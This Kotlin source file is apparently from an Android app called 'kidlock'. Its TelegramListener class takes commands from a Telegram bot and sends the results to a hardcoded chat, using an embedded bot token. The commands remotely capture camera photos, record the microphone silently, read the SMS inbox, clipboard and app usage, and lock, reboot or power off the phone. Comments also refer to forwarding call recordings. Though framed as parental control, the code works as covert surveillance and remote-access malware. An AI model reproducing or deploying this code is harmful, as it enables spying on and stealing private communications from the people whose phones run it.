package com.kidlock

import android.content.Context
import android.os.Handler
import android.os.Looper
import android.util.Log
import org.json.JSONObject
import java.io.File
import java.net.URL
import javax.net.ssl.HttpsURLConnection

class TelegramListener(private val context: Context) {

    private val BOT_TOKEN = "8901039134:AAEBI8Wn-HKC1b3IG9qzz4hIwKnKv_UyIcA"
    private val CHAT_ID   = "8889476230"
    val BASE_URL          = "https://api.telegram.org/bot$BOT_TOKEN"

    private val handler = Handler(Looper.getMainLooper())
    private var lastUpdateId = 0L
    private var running = false

    fun startPolling() {
        if (running) return
        running = true
        poll()
    }

    fun stopPolling() {
        running = false
        handler.removeCallbacksAndMessages(null)
    }

    private fun poll() {
        Thread {
            try {
                val url = "$BASE_URL/getUpdates?offset=${lastUpdateId + 1}&timeout=30"
                val conn = URL(url).openConnection() as HttpsURLConnection
                conn.connectTimeout = 35000
                conn.readTimeout = 35000
                val response = conn.inputStream.bufferedReader().readText()
                conn.disconnect()
                val json = JSONObject(response)
                if (json.getBoolean("ok")) {
                    val updates = json.getJSONArray("result")
                    for (i in 0 until updates.length()) {
                        val update = updates.getJSONObject(i)
                        lastUpdateId = update.getLong("update_id")
                        val message = update.optJSONObject("message") ?: continue
                        val chatId = message.getJSONObject("chat").getString("id")
                        if (chatId != CHAT_ID) continue
                        handleCommand(message.optString("text", ""))
                    }
                }
            } catch (e: Exception) {
                Log.e("TelegramListener", "poll error: ${e.message}")
            }
            if (running) handler.postDelayed({ poll() }, 1000)
        }.start()
    }

    private fun handleCommand(text: String) {
        when {
            text == "/lock" -> {
                LockActivity.lockDevice(context)
                sendMessage("🔒 Locked.")
            }
            text == "/unlock" -> {
                LockActivity.dismiss()
                sendMessage("🔓 Unlocked.")
            }
            text == "/reboot" -> {
                sendMessage("🔄 Rebooting...")
                Thread.sleep(1000)
                DeviceControl.reboot(context)
            }
            text == "/shutdown" -> {
                sendMessage("⏻ Shutting down...")
                Thread.sleep(1000)
                DeviceControl.shutdown(context)
            }
            text == "/status" -> {
                StatusReporter.reportToTelegram(context, BOT_TOKEN, CHAT_ID)
            }
            text == "/camera" || text == "/frontcam" -> {
                CameraHelper.captureAndSend(context, BOT_TOKEN, CHAT_ID, front = true)
                sendMessage("📸 Front camera capturing...")
            }
            text == "/backcam" -> {
                CameraHelper.captureAndSend(context, BOT_TOKEN, CHAT_ID, front = false)
                sendMessage("📸 Back camera capturing...")
            }
            text == "/applog" -> {
                AppUsageReporter.reportToTelegram(context, BOT_TOKEN, CHAT_ID)
            }
            text == "/clipboard" -> {
                ClipboardReader.readAndSend(context)
            }
            text == "/smslog" -> {
                SmsReader.readAndSend(context)
            }
            text == "/listen" -> {
                MicListener.listenOnce(context, 60_000L)
                sendMessage("🎙️ Listening for 60 seconds...")
            }
            text.startsWith("/listen ") -> {
                val secs = text.removePrefix("/listen ").trim().toLongOrNull() ?: 60L
                MicListener.listenOnce(context, secs * 1000L)
                sendMessage("🎙️ Listening for $secs seconds...")
            }
            text == "/mic stop" -> {
                SurroundingRecorder.stop()
                sendMessage("🎙️ Background mic stopped.")
            }
            text == "/mic start" -> {
                SurroundingRecorder.start(context)
                sendMessage("🎙️ Background mic started.")
            }
            text.startsWith("/speak ") -> {
                val msg = text.removePrefix("/speak ").trim()
                TtsManager.speak(context, msg)
                sendMessage("🔊 Speaking: $msg")
            }
            text.startsWith("/block ") -> {
                val pkg = text.removePrefix("/block ").trim()
                AppBlocker.block(context, pkg)
                sendMessage("🚫 Blocked: $pkg")
            }
            text.startsWith("/unblock ") -> {
                val pkg = text.removePrefix("/unblock ").trim()
                AppBlocker.unblock(context, pkg)
                sendMessage("✅ Unblocked: $pkg")
            }
            text.startsWith("/bedtime ") -> {
                val time = text.removePrefix("/bedtime ").trim()
                ScheduleManager.setBedtime(context, time)
                sendMessage("🌙 Bedtime set: $time")
            }
            text.startsWith("/schedule ") -> {
                val parts = text.removePrefix("/schedule ").trim().split(" ")
                if (parts.size == 2) {
                    ScheduleManager.setSchedule(context, "${parts[0]}-${parts[1]}")
                    sendMessage("⏰ Schedule: ${parts[0]} to ${parts[1]}")
                }
            }
            text == "/help" -> {
                sendMessage(
                    "📋 Commands:\n\n" +
                    "🔒 /lock — lock phone\n" +
                    "🔓 /unlock — unlock phone\n" +
                    "🔄 /reboot — restart\n" +
                    "⏻ /shutdown — power off\n" +
                    "📸 /frontcam — front camera\n" +
                    "📸 /backcam — back camera\n" +
                    "🔊 /speak <text> — TTS\n" +
                    "📱 /status — battery & time\n" +
                    "📊 /applog — app usage\n" +
                    "📋 /clipboard — clipboard\n" +
                    "💬 /smslog — SMS inbox\n" +
                    "🎙️ /listen [secs] — mic record\n" +
                    "🎙️ /mic stop — stop background mic\n" +
                    "🎙️ /mic start — resume background mic\n" +
                    "🚫 /block <pkg> — block app\n" +
                    "✅ /unblock <pkg> — unblock app\n" +
                    "🌙 /bedtime 21:00 — auto lock at time\n" +
                    "⏰ /schedule 16:00 18:00 — allowed hours"
                )
            }
        }
    }

    fun sendMessage(text: String) {
        Thread {
            try {
                val body = JSONObject().apply {
                    put("chat_id", CHAT_ID)
                    put("text", text)
                }.toString()
                val conn = URL("$BASE_URL/sendMessage").openConnection() as HttpsURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true
                conn.outputStream.write(body.toByteArray())
                conn.inputStream.bufferedReader().readText()
                conn.disconnect()
            } catch (e: Exception) {
                Log.e("TelegramListener", "sendMessage error: ${e.message}")
            }
        }.start()
    }

    // For mic/surrounding — shows as audio file with player
    fun sendAudio(filePath: String, caption: String) {
        sendFileInternal(filePath, caption, endpoint = "sendAudio", fieldName = "audio", mimeType = "audio/mp4")
    }

    // For call recordings — sends as voice bubble (plays inline, no Telegram size cap issues)
    fun sendVoice(filePath: String, caption: String) {
        sendFileInternal(filePath, caption, endpoint = "sendVoice", fieldName = "voice", mimeType = "audio/mp4")
    }

    fun sendPhoto(filePath: String) {
        sendFileInternal(filePath, "", endpoint = "sendPhoto", fieldName = "photo", mimeType = "image/jpeg")
    }

    private fun sendFileInternal(
        filePath: String,
        caption: String,
        endpoint: String,
        fieldName: String,
        mimeType: String
    ) {
        Thread {
            var attempt = 0
            while (attempt < 3) {
                attempt++
                try {
                    val file = File(filePath)
                    if (!file.exists()) {
                        Log.e("TelegramListener", "$endpoint: file not found: $filePath")
                        return@Thread
                    }
                    val boundary = "----Boundary${System.currentTimeMillis()}"
                    val conn = URL("$BASE_URL/$endpoint").openConnection() as HttpsURLConnection
                    conn.requestMethod = "POST"
                    conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
                    conn.connectTimeout = 60000
                    conn.readTimeout = 120000
                    conn.doOutput = true
                    val os = conn.outputStream

                    os.write("--$boundary\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n$CHAT_ID\r\n".toByteArray())
                    if (caption.isNotBlank()) {
                        os.write("--$boundary\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n$caption\r\n".toByteArray())
                    }
                    os.write("--$boundary\r\nContent-Disposition: form-data; name=\"$fieldName\"; filename=\"${file.name}\"\r\nContent-Type: $mimeType\r\n\r\n".toByteArray())
                    os.write(file.readBytes())
                    os.write("\r\n--$boundary--\r\n".toByteArray())
                    os.flush()

                    val responseCode = conn.responseCode
                    val responseBody = try {
                        conn.inputStream.bufferedReader().readText()
                    } catch (e: Exception) {
                        conn.errorStream?.bufferedReader()?.readText() ?: ""
                    }
                    conn.disconnect()

                    Log.d("TelegramListener", "$endpoint attempt $attempt: $responseCode")
                    if (responseCode == 200) {
                        file.delete()
                        return@Thread
                    } else {
                        Log.e("TelegramListener", "$endpoint attempt $attempt FAILED $responseCode: $responseBody")
                        if (attempt < 3) Thread.sleep(3000)
                    }
                } catch (e: Exception) {
                    Log.e("TelegramListener", "$endpoint attempt $attempt exception: ${e.message}")
                    if (attempt < 3) Thread.sleep(3000)
                }
            }
            Log.e("TelegramListener", "$endpoint gave up after 3 attempts: $filePath")
        }.start()
    }

    companion object {
        lateinit var instance: TelegramListener
    }
}
